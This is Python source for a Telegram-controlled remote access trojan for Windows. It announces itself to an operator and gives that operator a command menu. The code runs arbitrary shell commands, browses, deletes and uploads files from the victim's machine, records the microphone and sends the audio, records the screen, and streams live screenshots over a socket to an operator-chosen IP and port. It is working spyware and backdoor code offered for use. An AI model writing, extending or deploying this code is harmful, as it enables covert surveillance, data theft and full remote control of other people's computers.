import subprocess
import pyautogui
import pyaudio
import socket
import pickle
import struct
import time
import wave
import cv2
import os

import numpy as np

from ctypes  import windll
from telebot import TeleBot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from PIL import Image


""" Variables """
API_TOKEN = "token"
ADMIN_ID = id
bot = TeleBot(API_TOKEN)

markup = ReplyKeyboardMarkup(True, True)
markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
        KeyboardButton("dir"), KeyboardButton("rm_file"),
        KeyboardButton("exec_cmd"), KeyboardButton("get_file"), 
        KeyboardButton("record_audio"), KeyboardButton("get_audio"),
        KeyboardButton("record_video"), KeyboardButton("get_video"),
        KeyboardButton("get_screen"))


""" Fn """
def checkID(ms):
    if ms.from_user.id == ADMIN_ID:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN_ID, "USED:")
        bot.send_message(ADMIN_ID, info)
        return False

def create_markup():
    markup = ReplyKeyboardMarkup()
    list_files = os.listdir(os.getcwd())
    for i in list_files:
        markup.add(i)

    markup.add("EXIT")
    return markup

def recordAUDIO(self, time=6):
        p = pyaudio.PyAudio()
        stream = p.open(format=self.FORMAT,
                        channels=self.channels,
                        rate=self.sample_rate,
                        input=True,
                        output=True,
                        frames_per_buffer=self.chunk)
        
        frames = []
        for i in range(int(self.sample_rate / self.chunk * time)):
            data = stream.read(self.chunk)
            frames.append(data)

            with open('dump_record_audio.dat', 'wb') as dump_out:
                pickle.dump(frames, dump_out, protocol=3)

        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(self.filename_audio, "wb")
        wf.setnchannels(self.channels)
        wf.setsampwidth(p.get_sample_size(self.FORMAT))
        wf.setframerate(self.sample_rate)

        wf.writeframes(b"".join(frames))

        wf.close()

""" Functional """
class Client:
    def __init__(self):
        self.client_width = windll.user32.GetSystemMetrics(0)
        self.client_height = windll.user32.GetSystemMetrics(1)
        self.SCREEN_SIZE = (self.client_width, self.client_height)
        self.fourcc = cv2.VideoWriter_fourcc(*"XVID")
        
        self.FORMAT = pyaudio.paInt16
        self.sample_rate = 44100
        self.channels = 1
        self.chunk = 2048
        
        self.filename_audio = "recorded_audio.wav"
        self.filename_video = "video1.avi"

    def check_command(self, ms):
        if ms.text == "cd":
            output = os.getcwd()
            bot.send_message(ADMIN_ID, output, reply_markup=markup)
        
        elif ms.text == "chdir":
            markup_chdir = create_markup()
            markup_chdir.add("..")
            
            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_chdir)
            
            @bot.message_handler(content_types=["text"])
            def chdir_next(ms):
                if ms.text != "EXIT":
                    try:
                        os.chdir(ms.text)
                        output = os.getcwd()
                        bot.send_message(ADMIN_ID, output, reply_markup=markup)
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
            bot.register_next_step_handler(ms, chdir_next)

        elif ms.text == "dir":
            try:
                output = os.listdir(os.getcwd())
                output = '\n'.join(output)
                
                if output:
                    bot.send_message(ADMIN_ID, output, reply_markup=markup)
                else:
                    bot.send_message(ADMIN_ID, "<Empty>", reply_markup=markup)
            except Exception as e:
                bot.send_message(ADMIN_ID, f"Error:\n{e}")

        elif ms.text == "rm_file":
            markup_rm = create_markup()
            
            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_rm)

            @bot.message_handler(content_types=["text"])
            def rm_file_next(ms):
                if ms.text != "EXIT":
                    try:
                        os.remove(ms.text)
                        bot.send_message(ADMIN_ID, "File removed ✅", reply_markup=markup)
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}", reply_markup=markup)
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)

            bot.register_next_step_handler(ms, rm_file_next)

        elif ms.text == "exec_cmd":
            markup_exec_cmd = ReplyKeyboardMarkup()
            markup_exec_cmd.add("EXIT")
            
            bot.send_message(ADMIN_ID, "Enter command...")

            @bot.message_handler(content_types=["text"])
            def exec_cmd_next(ms):
                if ms.text != "EXIT":
                    try:
                        output = subprocess.run(ms.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        output = output.stdout + output.stderr
                        if output:
                            bot.send_message(ADMIN_ID, output, reply_markup=markup)
                        else:
                            bot.send_message(ADMIN_ID, "<Empty>", reply_markup=markup)
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)

            bot.register_next_step_handler(ms, exec_cmd_next)

        elif ms.text == "get_file":
            markup_get_file = create_markup()
            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_get_file)
            
            @bot.message_handler(content_types=["text"])
            def get_file_next(ms):
                if ms.text != "EXIT":
                    try:
                        bot.send_document(ADMIN_ID, open(ms.text, "rb"), reply_markup=markup)
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
            bot.register_next_step_handler(ms, get_file_next)


        elif ms.text == "record_audio":
            markup_record_audio = ReplyKeyboardMarkup()
            markup_record_audio.add("EXIT")
            bot.send_message(ADMIN_ID, "Enter time, quantity iteration...", reply_markup=markup_record_audio)
            
            @bot.message_handler(content_types=["text"])
            def record_audio_next(ms):
                if ms.text != "EXIT":
                    try:
                        list_data = ms.text.split(" ")
                        time = int(list_data[0])
                        quantity = int(list_data[1])
                        bot.send_message(ADMIN_ID, "Recording 🎲")
                        
                        for i in range(quantity):
                            recordAUDIO(self, time)
                            with open(self.filename_audio, 'rb') as audio:
                                bot.send_audio(ADMIN_ID, audio)
                        
                        os.remove(self.filename_audio)
                        bot.send_message(ADMIN_ID, "Finished recording ✅", reply_markup=markup)
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)

            bot.register_next_step_handler(ms, record_audio_next)

        elif ms.text == "get_audio":
            with open("dump_record_audio.dat", "rb") as dump_in:
                unpickler = pickle.Unpickler(dump_in)
                frame = unpickler.load()

                p = pyaudio.PyAudio()
                stream = p.open(format=self.FORMAT,
                                channels=self.channels,
                                rate=self.sample_rate,
                                input=True,
                                output=True,
                                frames_per_buffer=self.chunk)
                
                wf = wave.open(self.filename_audio, "wb")
                wf.setnchannels(self.channels)
                wf.setsampwidth(p.get_sample_size(self.FORMAT))
                wf.setframerate(self.sample_rate)
                wf.writeframes(b"".join(frame))
                wf.close()
            
            bot.send_message(ADMIN_ID, "Unpacked ✅", reply_markup=markup)
            
            with open(self.filename_audio, "rb") as audio:
                bot.send_audio(ADMIN_ID, audio)
            
            os.remove(self.filename_audio)
            os.remove("dump_record_audio.dat")



        elif ms.text == "record_video":
            bot.send_message(ADMIN_ID, "Recording 🎲", reply_markup=markup)
        
            while True:
                stop_time = round(time.time()) + 70

                while os.path.exists(self.filename_video):
                    index = self.filename_video[5:-4]
                    self.filename_video = self.filename_video[:-5] + str(int(index) + 1) + ".avi"

                out = cv2.VideoWriter(filename=self.filename_video, fourcc=self.fourcc, fps=15.0, frameSize=(self.SCREEN_SIZE))

                while True:
                    if round(time.time()) == stop_time:
                        cv2.destroyAllWindows()
                        out.release()
                        break
                    
                    frame = pyautogui.screenshot()
                    frame = np.array(frame)
                    
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)

        elif ms.text == "get_video":
            markup_video = create_markup()
            bot.send_message(ADMIN_ID, "Enter path...", reply_markup=markup_video)
            
            @bot.message_handler(content_types=["text"])
            def get_video_next(ms):
                if ms.text != "EXIT":
                    try:
                        bot.send_video(ADMIN_ID, open(ms.text, "rb"), reply_markup=markup)
                        os.remove(ms.text)
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
            bot.register_next_step_handler(ms, get_video_next)


        elif ms.text == "get_screen":
            markup_get_screen = ReplyKeyboardMarkup()
            markup_get_screen.add("EXIT")
            bot.send_message(ADMIN_ID, "Enter port, ip...", reply_markup=markup_get_screen)
            
            @bot.message_handler(content_types=["text"])
            def getscreen_next(ms):
                if ms.text != "EXIT":
                    try:
                        list_data = ms.text.split()
                        PORT = int(list_data[0])
                        IP = list_data[1]

                        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        
                        while True:
                            try:
                                bot.send_message(ADMIN_ID, "Connection attempt 🎲")
                                clientsocket.connect((IP, PORT))
                                break
                            except Exception as e:
                                bot.send_message(ADMIN_ID, "Сonnection error ❌")
                                time.sleep(3)

                        bot.send_message(ADMIN_ID, "Successful connection ✅")
                        while True:
                            screen = pyautogui.screenshot()
                            frame = np.array(screen)
                            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                            image = cv2.resize(frame, (1024, 576), interpolation=cv2.INTER_AREA)
                            result, frame = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
                            data = pickle.dumps(frame, 0)
                            
                            try:
                                clientsocket.sendall(struct.pack(">L", len(data)) + data)
                            except ConnectionResetError:
                                self.__running = False
                            except ConnectionAbortedError:
                                self.__running = False
                            except BrokenPipeError:
                                self.__running = False
                            
                    except Exception as e:
                        bot.send_message(ADMIN_ID, f"Error:\n{e}")
                else:
                    bot.send_message(ADMIN_ID, "EXIT", reply_markup=markup)
                    
            bot.register_next_step_handler(ms, getscreen_next)


""" Start """
client = Client()
bot.send_message(ADMIN_ID, "ONLINE ✅")


@bot.message_handler(commands=["_start"])
def send_welcome(ms):
    if checkID(ms):
        bot.send_message(ADMIN_ID, text="/_start", reply_markup=markup)


@bot.message_handler(content_types=["text"])
def CheckCommand(ms):
    if checkID(ms):
        try:
            client.check_command(ms)
        except KeyError:
            bot.send_message(ADMIN_ID, "Function not found")
        except Exception as e:
            bot.send_message(ADMIN_ID, e)

bot.infinity_polling()